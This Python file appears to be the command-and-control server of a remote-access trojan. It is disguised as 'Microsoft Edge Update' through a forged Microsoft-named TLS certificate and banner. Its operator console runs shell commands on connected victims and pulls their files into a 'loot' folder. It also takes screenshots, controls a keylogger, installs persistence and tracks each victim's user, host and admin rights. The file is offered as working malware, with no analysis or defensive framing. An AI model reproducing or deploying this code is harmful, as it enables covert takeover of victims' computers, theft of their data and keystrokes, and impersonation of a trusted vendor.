import argparse
import hashlib
import json
import os
import queue
import shlex
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
from datetime import datetime

HOST = "0.0.0.0"
PORT = 443
BASE = os.path.dirname(os.path.abspath(__file__))
CERT = os.path.join(BASE, "cert.pem")
KEY = os.path.join(BASE, "key.pem")
LOOT = os.path.join(BASE, "loot")
USE_TLS = True
TLS_CTX = None

C = {
    "r": "\x1b[0m", "dim": "\x1b[90m", "g": "\x1b[92m", "y": "\x1b[93m",
    "b": "\x1b[96m", "red": "\x1b[91m", "bold": "\x1b[1m",
}
SESSIONS = {}
LOCK = threading.Lock()
RID = 0
RID_LOCK = threading.Lock()
STOP = threading.Event()


def cvt():
    if os.name == "nt":
        import ctypes
        k = ctypes.windll.kernel32
        k.SetConsoleMode(k.GetStdHandle(-11), 7)


def say(msg):
    print(msg, flush=True)


def next_rid():
    global RID
    with RID_LOCK:
        RID += 1
        return RID


def pack(msg, payload=b""):
    h = json.dumps(msg, separators=(",", ":")).encode()
    return struct.pack(">I", len(h)) + h + struct.pack(">Q", len(payload)) + payload


def recvall(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(min(262144, n - len(buf)))
        if not chunk:
            raise ConnectionError("peer closed")
        buf += chunk
    return bytes(buf)


def recv(sock):
    (hl,) = struct.unpack(">I", recvall(sock, 4))
    if hl > 8_000_000:
        raise ConnectionError("bad header")
    hdr = json.loads(recvall(sock, hl) or b"{}")
    (pl,) = struct.unpack(">Q", recvall(sock, 8))
    if pl > 700_000_000:
        raise ConnectionError("bad payload")
    payload = recvall(sock, pl) if pl else b""
    return hdr, payload


def ensure_cert():
    if os.path.exists(CERT) and os.path.exists(KEY):
        return True
    try:
        subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
             "-keyout", KEY, "-out", CERT, "-days", "3650",
             "-subj", "/CN=Microsoft Edge Update/O=Microsoft Corporation",
             "-addext", "subjectAltName=DNS:microsoft.com,DNS:*.microsoft.com"],
            capture_output=True, timeout=60, check=True,
        )
        return True
    except Exception as e:
        say(f"{C['red']}[!] cert generation failed ({e}); running plaintext{C['r']}")
        return False


class Session:
    def __init__(self, sock, addr):
        self.sock = sock
        self.addr = addr
        self.info = {}
        self.sid = hashlib.sha256(f"{addr}{time.time()}".encode()).hexdigest()[:8]
        self.q = queue.Queue()
        self.alive = True
        self.last = time.time()
        self.send_lock = threading.Lock()

    def start(self):
        threading.Thread(target=self.reader, daemon=True).start()
        threading.Thread(target=self.heartbeat, daemon=True).start()

    def reader(self):
        self.sock.settimeout(120)
        try:
            while self.alive:
                try:
                    hdr, payload = recv(self.sock)
                except socket.timeout:
                    if time.time() - self.last > 75:
                        break
                    continue
                self.last = time.time()
                self.q.put((hdr, payload))
        except Exception:
            pass
        self.alive = False
        with LOCK:
            SESSIONS.pop(self.sid, None)
        say(f"\n{C['red']}[-] {self.label()} disconnected{C['r']}")

    def heartbeat(self):
        while self.alive:
            time.sleep(25)
            if not self.alive:
                return
            if time.time() - self.last > 75:
                self.close()
                return
            try:
                self.send({"type": "ping", "rid": 0})
            except Exception:
                self.close()
                return

    def send(self, hdr, payload=b""):
        with self.send_lock:
            self.sock.sendall(pack(hdr, payload))

    def request(self, hdr, payload=b"", timeout=300):
        if not self.alive:
            raise ConnectionError("dead")
        rid = next_rid()
        hdr["rid"] = rid
        self.send(hdr, payload)
        deadline = time.time() + timeout
        while True:
            left = deadline - time.time()
            if left <= 0:
                raise TimeoutError("command timed out")
            try:
                rh, rp = self.q.get(timeout=left)
            except queue.Empty:
                raise TimeoutError("command timed out")
            if rh.get("rid") == rid:
                return rh, rp
            if rh.get("type") == "hello":
                self.info = rh.get("info", {})
            elif rh.get("type") == "result" and "rid" not in rh:
                say(f"\n{C['dim']}{self.sid}{C['r']} {rp.decode('utf-8', 'replace')}")

    def close(self):
        self.alive = False
        try:
            self.sock.close()
        except Exception:
            pass

    def label(self):
        i = self.info
        return f"{self.sid} {i.get('host', '?')}\\{i.get('user', '?')} @{i.get('ip', '?')}"


def accept_loop(srv):
    while not STOP.is_set():
        try:
            raw, addr = srv.accept()
        except OSError:
            return
        try:
            if USE_TLS:
                raw = TLS_CTX.wrap_socket(raw, server_side=True)
        except ssl.SSLError:
            try:
                raw.close()
            except Exception:
                pass
            continue
        s = Session(raw, addr)
        try:
            s.sock.settimeout(15)
            hdr, _ = recv(s.sock)
        except Exception:
            s.close()
            continue
        s.info = hdr.get("info", {})
        key = (s.info.get("id"), s.info.get("session"))
        old = None
        with LOCK:
            for x in list(SESSIONS.values()):
                if x is not s and (x.info.get("id"), x.info.get("session")) == key:
                    old = x
                    break
        if old:
            old.close()
            with LOCK:
                SESSIONS.pop(old.sid, None)
        with LOCK:
            SESSIONS[s.sid] = s
        s.start()
        i = s.info
        tag = "reconnected" if old else "new session"
        say(f"\n{C['g']}[+] {s.sid}{C['r']} {C['bold']}{i.get('host')}\\{i.get('user')}{C['r']} "
            f"@{i.get('ip')} admin={i.get('admin')} os={i.get('os')} ({tag})")
        say(f"{C['dim']}    type 'use {s.sid}' to interact{C['r']}")


def prompt() -> str:
    return f"{C['b']}{C['bold']}edge{C['r']}{C['dim']}> {C['r']}"


def do_list():
    with LOCK:
        items = list(SESSIONS.values())
    if not items:
        say(f"{C['dim']}(no sessions){C['r']}")
        return
    for s in items:
        i = s.info
        say(f"  {C['g']}{s.sid}{C['r']}  {i.get('host')}\\{i.get('user')}  @{i.get('ip')}  "
            f"{'ADMIN' if i.get('admin') else 'user'}  {i.get('os')}")


def save_loot(s, name, data):
    d = os.path.join(LOOT, s.sid)
    os.makedirs(d, exist_ok=True)
    safe = os.path.basename(name) or "file.bin"
    stamp = datetime.now().strftime("%H%M%S")
    path = os.path.join(d, f"{stamp}_{safe}")
    with open(path, "wb") as f:
        f.write(data)
    return path


def show(res, payload, s, save_files=False):
    rh, rp = res
    t = rh.get("type")
    if t == "file":
        path = save_loot(s, rh.get("name", "file.bin"), payload)
        say(f"{C['g']}[+] saved {len(payload)} bytes -> {path}{C['r']}")
        return
    if t == "screen":
        ext = rh.get("fmt", "png")
        path = save_loot(s, f"screenshot.{ext}", payload)
        say(f"{C['g']}[+] screenshot ({len(payload)} bytes) -> {path}{C['r']}")
        return
    text = payload.decode("utf-8", "replace")
    rc = rh.get("rc")
    color = "" if rc == 0 else C["red"]
    say(f"{color}{text}{C['r']}" if text else f"{C['dim']}(no output, rc={rc}){C['r']}")


def parse_pair(line):
    parts = shlex.split(line, posix=False)
    return [p.strip('"') for p in parts]


def interact(s):
    say(f"{C['dim']}session {s.sid} — 'back' exits, 'help' lists commands{C['r']}")
    while s.alive:
        try:
            line = input(f"{C['y']}{s.info.get('host')}\\{s.info.get('user')}{C['r']}"
                         f" {C['dim']}{s.info.get('cwd', '?')}{C['r']}$ ").strip()
        except (EOFError, KeyboardInterrupt):
            say("")
            return
        if not line:
            continue
        low = line.lower()
        if low in ("back", "b", "exit"):
            return
        try:
            if low == "kill":
                s.close()
                say(f"{C['dim']}session closed{C['r']}")
                return
            if low == "help":
                say("""  <anything>          run as shell command
   exec <anything>     run as shell command (explicit)
   cd <dir>            change working directory on target
  !download <path>    pull a file from target
  !upload <local> [remote]  push a file to target
  !screen             screenshot target desktop
  !sysinfo            full target information
  !persist            install persistence
  !unpersist          remove persistence
  !keys start|stop|dump|clear   keylogger
  !sleep <secs>       pause the agent
  !uninstall          remove persistence and delete self
  back                leave session menu
  kill                close connection""")
                continue
            if low.startswith("cd "):
                rh, rp = s.request({"type": "cd", "path": line[3:].strip()}, timeout=30)
                s.info["cwd"] = rp.decode("utf-8", "replace").strip()
                say(f"{C['dim']}{s.info['cwd']}{C['r']}")
                continue
            if low.startswith("!download "):
                res = s.request({"type": "download", "path": line[10:].strip()}, timeout=900)
                show(res, res[1], s)
                continue
            if low.startswith("!upload "):
                parts = parse_pair(line[8:])
                if not parts:
                    say("usage: !upload <local> [remote]")
                    continue
                local = parts[0]
                remote = parts[1] if len(parts) > 1 else os.path.basename(local)
                with open(local, "rb") as f:
                    data = f.read()
                res = s.request({"type": "upload", "path": remote}, data, timeout=900)
                show(res, res[1], s)
                continue
            if low == "!screen":
                res = s.request({"type": "screen"}, timeout=120)
                show(res, res[1], s)
                continue
            if low == "!sysinfo":
                res = s.request({"type": "sysinfo"}, timeout=60)
                show(res, res[1], s)
                continue
            if low == "!persist":
                res = s.request({"type": "persist"}, timeout=90)
                show(res, res[1], s)
                continue
            if low == "!unpersist":
                res = s.request({"type": "unpersist"}, timeout=60)
                show(res, res[1], s)
                continue
            if low == "!uninstall":
                res = s.request({"type": "uninstall"}, timeout=60)
                show(res, res[1], s)
                s.close()
                return
            if low.startswith("!keys"):
                action = line[5:].strip().lower() or "dump"
                res = s.request({"type": "keys", "action": action}, timeout=60)
                show(res, res[1], s)
                continue
            if low.startswith("!sleep "):
                try:
                    secs = int(line[7:].strip())
                except ValueError:
                    say("usage: !sleep <secs>")
                    continue
                res = s.request({"type": "sleep", "secs": secs}, timeout=86500)
                show(res, res[1], s)
                continue
            cmd = line[5:].strip() if low.startswith("exec ") else line
            res = s.request({"type": "exec", "cmd": cmd, "timeout": 300}, timeout=360)
            show(res, res[1], s)
            rh, rp = res
            if rh.get("type") == "result":
                try:
                    agg = s.request({"type": "exec", "cmd": "cd", "timeout": 10}, timeout=30)
                    s.info["cwd"] = agg[1].decode("utf-8", "replace").strip()
                except Exception:
                    pass
        except TimeoutError:
            say(f"{C['red']}[!] timeout{C['r']}")
        except (ConnectionError, OSError):
            say(f"{C['red']}[!] connection lost{C['r']}")
            return


def console():
    while not STOP.is_set():
        try:
            line = input(prompt()).strip()
        except (EOFError, KeyboardInterrupt):
            say("")
            STOP.set()
            return
        if not line:
            continue
        low = line.lower()
        if low in ("exit", "quit"):
            STOP.set()
            return
        if low in ("list", "ls"):
            do_list()
            continue
        if low == "help":
            say("""  list                list sessions
  use <sid>           interact with a session
  kill <sid>          drop a session
  exit                stop server
  help                this help""")
            continue
        if low.startswith("use "):
            sid = line[4:].strip()
            with LOCK:
                s = SESSIONS.get(sid) or next(
                    (x for x in SESSIONS.values() if x.sid.startswith(sid)), None)
            if not s:
                say(f"{C['red']}no such session: {sid}{C['r']}")
                continue
            if not s.alive:
                say(f"{C['red']}session dead{C['r']}")
                continue
            interact(s)
            continue
        if low.startswith("kill "):
            sid = line[5:].strip()
            with LOCK:
                s = SESSIONS.get(sid)
            if s:
                s.close()
                say(f"{C['dim']}closed {sid}{C['r']}")
            else:
                say(f"{C['red']}no such session{C['r']}")
            continue
        with LOCK:
            only = list(SESSIONS.values())
        if len(only) == 1:
            interact(only[0])
            continue
        say(f"{C['red']}unknown command: {line} (try 'help'){C['r']}")


def main():
    global HOST, PORT, USE_TLS, TLS_CTX
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=HOST)
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--plain", action="store_true", help="disable TLS")
    args = ap.parse_args()
    HOST, PORT, USE_TLS = args.host, args.port, not args.plain
    cvt()
    os.makedirs(LOOT, exist_ok=True)
    if USE_TLS:
        if not ensure_cert():
            USE_TLS = False
        else:
            TLS_CTX = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            TLS_CTX.load_cert_chain(CERT, KEY)
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((HOST, PORT))
        srv.listen(64)
    except OSError as e:
        say(f"{C['red']}[!] bind {HOST}:{PORT} failed: {e}{C['r']}")
        sys.exit(1)
    say(f"{C['b']}{C['bold']}==== Microsoft Edge Update - control server ===={C['r']}")
    say(f"listening on {HOST}:{PORT}  tls={'on' if USE_TLS else 'off'}  loot={LOOT}")
    say(f"{C['dim']}type 'help' for commands{C['r']}")
    threading.Thread(target=accept_loop, args=(srv,), daemon=True).start()
    try:
        console()
    finally:
        STOP.set()
        try:
            srv.close()
        except Exception:
            pass
        with LOCK:
            for s in SESSIONS.values():
                s.close()
        say(f"{C['dim']}bye{C['r']}")


if __name__ == "__main__":
    main()
